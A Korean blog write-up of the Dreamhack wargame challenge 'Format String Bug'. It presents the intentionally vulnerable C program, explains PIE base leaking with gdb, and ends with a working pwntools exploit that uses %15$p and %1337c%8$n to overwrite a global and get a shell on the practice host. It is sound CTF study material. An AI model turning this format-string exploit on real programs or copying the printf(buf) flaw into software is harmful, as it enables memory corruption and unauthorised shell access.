---
title: '[Dreamhack] Format String Bug'
description: Dreamhack [Wargame] - Format String Bug
author: juhyeongkim
date: 2024-10-31 00:00:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Pwnable]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
# path: 
    # lqip: 
    # alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/356)

{% raw %}

## 바이너리 분석

```c
// Name: fsb_overwrite.c
// Compile: gcc -o fsb_overwrite fsb_overwrite.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_string(char *buf, size_t size)
{
  ssize_t i = read(0, buf, size); // 읽은 바이트 수를 리턴 (-1 : 오류, 0 : EOF 만난 경우)
  if (i == -1)
  {
    perror("read");
    exit(1);
  }

  if (i < size) // 0x20보다 읽은 바이트 수가 적은 경우
  {
    if (i > 0 && buf[i - 1] == '\n') // buf의 마지막이 개행문자로 끝나는 경우
      i--;
    buf[i] = 0; // 개행문자('\n') 을 지우고 `0`으로 설정
  }
}

int changeme;

int main()
{
  char buf[0x20];

  setbuf(stdout, NULL);

  while (1)
  {
    get_string(buf, 0x20);
    printf(buf);
    puts("");
    if (changeme == 1337)
    {
      system("/bin/sh");
    }
  }
}
```

<img width="631" alt="image" src="https://github.com/user-attachments/assets/37fb6f58-71ed-4d7e-9571-f4326c6c1867">

먼저, 해당 바이너리는 `get_string()` 함수를 통해 포맷 스트링으로 사용되는 `buf`에 `0x20` 크기의 입력을 받아주고, `0x20` 보다 입력된 바이트의 수가 적고, 마지막 바이트가 개행문자(`'\n'`)로 끝나는 경우 개행문자를 `0` 으로 바꿔준다.

이후, `changeme`의 값이 `1337` 이라면 쉘을 획득할 수 있는 바이너리이다. 따라서, 목표는 포맷 스트링 버그를 통해 `changeme` 변수에 `1337`을 입력하는 것이다.

<br>

## **changeme**의 주소 찾기

`changeme` 변수는 스택에 존재하지 않고, 초기화되지 않은 전역 변수이다. 

따라서 해당 변수의 주소는 `BSS 세그먼트`에 존재한다. 해당 바이너리에는 `PIE`가 적용되어 있기 때문에 `gdb`를 통해 찾은 `changeme` 가상주소를 바로 넣어줄 수 없고, `BSS 세그먼트의 베이스 주소`를 구해야 한다고 생각했다.

<br>

### 헷갈린 부분

그런데, 문제 풀이를 보니 `BSS 세그먼트`의 베이스 주소를 구하는게 아니라 gdb에서 `vmmap`을 통해 `바이너리가 매핑된 주소` = `코드 베이스` = `PIE 베이스`를 찾아서 해당 주소에 `changeme`의 오프셋을 더해주는 방법을 사용하였다.

내 생각대로면, `PIE`가 적용되면 스택, 힙 뿐만 아니라 코드 세그먼트, 데이터 세그먼트도 전부 랜덤화되기 때문에 데이터 세그먼트의 베이스를 구해서 데이터 세그먼트로 부터의 `changeme`의 오프셋을 더해야 된다고 생각했는데, 잘못된 개념을 이해하고 있었다.

`ASLR`에 의해 `스택`, `힙`, `공유 라이브러리`의 베이스 주소가 매번 바뀌지만, `코드 세그먼트`와 `데이터 세그먼트`의 베이스 주소는 `바이너리가 매핑되는 주소`가 바뀌지 않았기 때문에 동일했다.

`PIE`가 적용되었을 때 `코드 세그먼트`와 `데이터 세그먼트`의 베이스 주소가 바뀌는 이유는, 해당 세그먼트의 오프셋이 `ASLR`에서처럼 계속 바뀌는게 아니라,

**`바이너리가 매핑되는 주소 = 코드 베이스 = PIE 베이스`가 바뀌기 때문이다.**

결국, 다시 정리해보면 `코드 세그먼트`와 `데이터 세그먼트`의 베이스 주소(바이너리 베이스로부터의)에 대한 오프셋은 `PIE`가 적용되어도 바뀌지 않지만, 바이너리가 매핑되는 주소가 바뀌기 때문에 이들 또한 매번 실행할 때마다 바뀌어 보이는 것이다.

따라서, `gdb`를 통해서 확인되는 코드 세그먼트, 데이터 세그먼트 내의 심볼에 대한 오프셋들은 전부 `바이너리가 매핑되는 주소 = 코드 베이스 = PIE 베이스`로 부터의 오프셋이라고 생각하면 된다.

따라서 우리는 바이너리가 매핑된 주소를 구한 후, `changeme`의 오프셋을 더해주는 방식을 사용해야 한다. 위의 세 방식으로 했을 때 전부 `0x401c` 으로 오프셋은 동일하다.

- `gdb`에서 `i var changeme`로 찾기 (`-g` 옵션 때문에 `print &changeme`로 구했음)

<img width="267" alt="image" src="https://github.com/user-attachments/assets/39c6f776-e9be-41f3-9887-9af4136eca78">

- `readelf -s | grep changeme`로 찾기

<img width="842" alt="image" src="https://github.com/user-attachments/assets/6c60a55a-e69a-4c32-af4a-1bc5b6111e93">

- `pwntools`의 `elf.symbols["changeme"]`로 찾기

그리고 이 방법이 맞는지 검증해보기 위해 `vmmap`에서 바이너리가 매핑된 가상 주소인 `0x555555554000`를 `changeme`가 매핑된 가상 주소에서 빼봤는데 `0x401c`가 나오기 때문에 더욱 확실한 것을 알 수 있다.

참고로 주로 `r-xp`인 영역이 `CODE` 세그먼트, `rw-p` 영역이 `DATA` 세그먼트(`BSS` 포함), `r--p`인 영역이 읽기만 가능한 `RODATA` 세그먼트(`const`)이다.

<img width="1116" alt="image" src="https://github.com/user-attachments/assets/bd3b63d6-a164-4389-9f7b-367831813460">

그리고, `info files`로 각 영역을 출력해보면 맨 아래의 `.bss` 영역에 `0x401c` 오프셋이 해당되는 것을 알 수 있다.

<img width="891" alt="image" src="https://github.com/user-attachments/assets/f29d2026-e16f-48c4-8df3-e3171a4db8a2">

**결론적으로 `PIE`가 적용되면 바이너리가 매핑되는 메모리 주소가 매번 바뀌므로 가상 주소도 바뀌게 되어, 바이너리가 매핑된 주소를 구해준 후 거기에 `changeme`의 오프셋을 더해주면 된다.**

그럼 여기서 바이너리가 매핑된 가상 주소를 어떻게 구해야 할까 ?

먼저 바이너리에서 `printf(buf);`를 수행하기 직전으로 `breakpoint`를 설정하고(`b *main+76`), `[rsp + 0x__]`에서 바이너리가 매핑된 주소 내에 속하는 오프셋이 존재하는지 한번 찾아보자.(`x/32gx $rsp`)

`printf(buf);`를 수행하기 직전에 중단점을 설정하는 이유는, 여기서 `[rsp + 0x__]`의 상태를 봐야하기 때문이다.

<img width="513" alt="image" src="https://github.com/user-attachments/assets/0c139e05-f6af-454c-a8ce-7c4f3bbcf552">

이미지를 잘 보면, `[rsp + 0x48(72)]`에 `0x0000555555555293`라는 주소값이 존재한다. gdb를 통해 확인한 바이너리의 베이스 주소가 `0x555555554000`이고 바이너리의 범위는 `0x555555559000` 까지이므로, 이 때의 `[rsp + 0x48]`에 저장된 주소는 바이너리가 매핑된 주소 범위 내에 존재한다는 것을 알 수 있다.

<img width="1086" alt="image" src="https://github.com/user-attachments/assets/ac150d66-7969-4ffb-b55d-fecff6e9e999">

그럼 이제 `0x0000555555555293`에서 바이너리의 베이스 주소인 `0x555555554000` 에서 빼주면, `[rso + 0x48]`에 저장된 주소는 항상 바이너리의 베이스가 어떤 메모리에 매핑되던지와 상관없이 베이스 주소에서 `0x1293` 만큼 떨어진 오프셋에 위치한다는 것을 알 수 있다.

<img width="408" alt="image" src="https://github.com/user-attachments/assets/7a259ed4-873b-43c0-b0d9-65dffba76ea0">

따라서, 바이너리는 포맷스트링을 입력받고 `printf(buf);`를 `changeme`가 `1337`로 설정되기 전까지 계속 반복문을 돌기 때문에, 제일 처음에 `[rsp + 0x48]`를 출력해주기 위해 `%15$p`를 통해 출력해준 후 해당 주소를 받아서 `0x1293`을 빼주면 바이너리가 매핑된 베이스 주소를 알 수 있다.

<br>

## **[rsp]**와 **buf**의 위치 찾기

바이너리에 아래와 같이 `AAAAAAA%7$p`와 `AAAAAAA%6$p` 를 차례대로 입력해보면, `6`번째 인자인 `rsp`에 `buf`가 위치함을 알 수 있다.

<img width="642" alt="image" src="https://github.com/user-attachments/assets/05e6a3ec-925f-4cc5-9906-f08cbb9f9a5e">

위에서 `[rsp + 0x48]`이 `15`번쨰 인자였던 이유도 `[rsp]`가 `6`번째 인자이기 때문에 `9`(`8 x 9 = 72(0x48)`)를 더해준 `15`가 되는 것이다.

<br>

## Exploit

### 1. Leak base address

`[rsp + 0x48]`에 있는 값을 읽어오기 위해 반복문의 첫번째 `get_string()` 에서 `%15$p`를 입력해준 후, 포맷 스트링을 통해 출력되는 값을 `int(p.recvline()[:-1], 16)` 으로 받아서 오프셋인 `0x1293`을 빼준다.

`recvline()[:-1]`으로 받을 수 있는 이유는 `get_string`에서 `printf(buf)` 출력 후 `puts("");`을 통해 빈문자에 개행문자(`\n`)을 마지막에 더해주기 때문이다.

<br>

### 2. Get **changeme** address

저장한 베이스 주소에 `changeme`의 오프셋인 `0x401c` 더해준다. `elf.symbols['changeme']`를 통해 더해줘도 된다.

<br>

### 3. Overwrite **changeme**

이제 `changeme`의 주소를 8바이트 단위로 끊기는 `[rsp + 0x__]`에 저장해준 후 `%1337c%[n]$n`을 통해 `1337`을 입력해주면 된다. 

포맷 스트링에서 지정자로 사용되는 길이가 `10`이므로 `ljust(16)`을 통해 `16`바이트로 맞춰준 후 뒤에 `changeme`의 주소를 더해주면,

`changeme`는 `[rsp + 0x10]`에 존재하기 때문에 `8`번째 인자가 된다.

따라서, `buf`에는 `%1337c%8$n` + `p64(addr_changeme)` 를 저장해주면 된다.

```py
from pwn import *

# p = process("./fsb_overwrite")
p = remote("host3.dreamhack.games", 8643)
elf = ELF("./fsb_overwrite")

payload = b"%15$p"  # [rsp + 0x48] 에 저장된 주소를 읽어오기 위함
p.send(payload)

binary_base = int(p.recvline()[:-1], 16) - 0x1293  # [rsp + 0x48]에서 읽어온 주소에서 해당 주소의 오프셋을 빼주어서 바이너리의 베이스 주소를 구함
# addr_changeme = binary_base + elf.symbols['changeme']
addr_changeme = binary_base + 0x401c  # 바이너리의 베이스 주소에서 changeme 변수의 오프셋을 더해줌
payload = b"%1337c%8$n".ljust(16)  # 6번째 인자가 [rsp]이므로, [rsp + 0x10] 은 8번째 인자
payload += p64(addr_changeme)

p.send(payload)
p.interactive()
```

{% endraw %}